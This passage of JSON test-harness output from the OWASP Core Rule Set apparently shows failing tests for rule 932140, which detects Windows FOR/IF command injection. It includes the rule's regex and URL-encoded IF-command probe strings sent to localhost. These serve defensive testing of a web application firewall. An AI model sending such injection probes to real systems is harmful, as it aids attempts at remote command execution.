          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 92,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 92,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++%25VARIABLE%25+++EQU+0+++++Echo+An+error+was+found",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 93,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 93,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%2FI+++++item1%3D%3Ditem2+++++++++++CMD",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 94,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942210 - Detects chained SQL injection attempts 1/2", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 94,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%2FI+NOT+item1%3D%3Ditem2+++++++++++CMD",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 95,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942210 - Detects chained SQL injection attempts 1/2", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 95,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%2FI+NOT+1%3D%3D2+++++++++++++++++++CMD",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 96,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 96,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++%25_prefix%25%3D%3DSS6+++++++++GOTO+they_matched",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
